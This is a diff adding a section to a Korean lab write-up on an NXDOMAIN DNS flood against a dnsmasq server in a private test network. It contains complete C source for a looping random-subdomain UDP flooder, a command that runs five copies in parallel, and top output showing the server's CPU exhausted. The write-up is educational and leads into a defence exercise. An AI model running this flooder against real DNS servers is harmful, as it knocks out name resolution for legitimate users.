@@ -214,9 +214,126 @@ int main() {
 
 ![alt text](./img/nxdomain_flood4.png)  
 
-이걸 보내보면 무수히 빠른 속도로 존재하지않는 임의의 도메인 주소를 찾는 것을 확인해볼 수 있습니다.  
 
-### 
+```bash
+tail -f /var/log/dnsmasq.log
+```
+
+이걸 보내보면 무수히 빠른 속도로 존재하지않는 임의의 도메인 주소를 찾는 것을 확인해볼 수 있습니다.   
+
+<br>
+
+### 공격 실행  
+
+이제 공격코드를 실행해서 서비스 거부를 재현해보겠습니다.  
+그전에 위 코드는 `recvfrom`으로 응답을 받는 코드가 포함되어있기 때문에 해당 부분을 지워주고 printf 부분도 지워줬습니다.   
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <time.h>
+
+int main() {
+    int msg = socket(AF_INET, SOCK_DGRAM, 0);
+    struct sockaddr_in dest;
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(53);
+    dest.sin_addr.s_addr = inet_addr("192.168.125.10");
+
+    unsigned char packet[1024];
+    memset(packet, 0, sizeof(packet));
+
+    packet[2] = 0x01;
+    packet[3] = 0x00;
+    packet[5] = 0x01;
+
+    unsigned char query[] = {
+        0x03, 'd','o','s',
+        0x03, 'l','a','b',
+        0x00,
+        0x00, 0x01,
+        0x00, 0x01
+    };
+
+    srand(time(NULL));
+
+    while(1){
+        unsigned char buf[16];
+        buf[0] = 0x0F;
+        for (int i = 1; i < 16; i++) {
+            buf[i] = 'a' + (rand() % 26);
+        }
+
+        memcpy(packet + 12, buf, 16);
+        memcpy(packet + 28, query, sizeof(query));
+
+        uint16_t dns_id = (uint16_t)(rand() & 0xFFFF);
+        *(uint16_t *)packet = htons(dns_id);
+
+        sendto(msg, packet, 1024, 0, (struct sockaddr*)&dest, sizeof(dest));
+    }
+
+    close(msg);
+    return 0;
+}
+```  
+
+랜덤 문자열의 길이도 늘려주고 패킷의 크기도 늘렸습니다.  
+컴파일을 해준 뒤 병렬실행을 해주었습니다.  
+
+```bash
+seq 5 | xargs -I{} -P 5 ./dns_flood
+```
+
+<br>
+
+### 실행 결과  
+
+
+![alt text](./img/nxdomain_flood5.png)  
+
+거의 시작과 동시에 dos.lab의 접속이 막혔습니다.  
+top를 통해 alpine 서버의 상태를 정리해보면 아래와같습니다.  
+
+```sh
+CPU: 30% usr 15% sys 0% nic 0% idle 0% irq 45% sirq 
+
+9326 dnsmasq ... 30%
+9096 /sbin/syslogd ... 12%
+...
+```
+
+- 30% usr 
+    - dnsmasq와 같은 일반 어플리케이션이 CPU를 사용하는 비중입니다.  
+    - 여기선 dnsmasq가 패킷을 해석하고 응답을 만들기 위해 사용한 비중이 큽니다 
+- 15% sys
+    - 커널의 자체 연산 비중입니다.  
+    - syscall 처리, 메모리 할당, 프로세스 관리 등에 드는 비용입니다.  
+    - 여기선 로그를 적기 위해 사용한 비중도 대량 들어갑니다. (`/sbin/syslogd ... 12%`)
+- 45% sirq (softirq) ← 핵심
+    - 네트워크 패킷 처리 부하입니다.  
+    - 현재 CPU의 절반이나 사용하고 있으며 패킷을 검사하고 버퍼에 쌓는 작업만으로도 대부분의 자원을 사용하고 있습니다.  
+- 0% idle
+    - CPU가 쉴 틈없이 계속 돌아가고 있다는 의미입니다.  
+    - 정상 사용자에 대해서 처리해줄 여유가 없습니다.  
+
+
+<br>
+
+**요약**
+
+현재 Alpine 서버는 CPU Idle 0%로 자원이 완전히 고갈된 상태입니다.  
+
+특히 softirq(45%) 수치가 굉장히 높은 것을 볼 수 있는데, 이는 공격 측에서 보낸 패킷이 커널 네트워크 스택에 엄청난 부하를 주고 있음을 뜻합니다.  
+dnsmasq가 30%의 점유율을 보이고 있지만, 그보다 먼저 커널 수준에서 패킷 처리에 과부하가 걸려 정상적인 서비스 응답이 불가능한 자원 소진형 공격이 성공했음을 확인할 수 있습니다.  
+
+다음 실습에서 이를 방어해보는 실습을 진행해보겠습니다.  
+
+<br>
 
 
 ### Reference
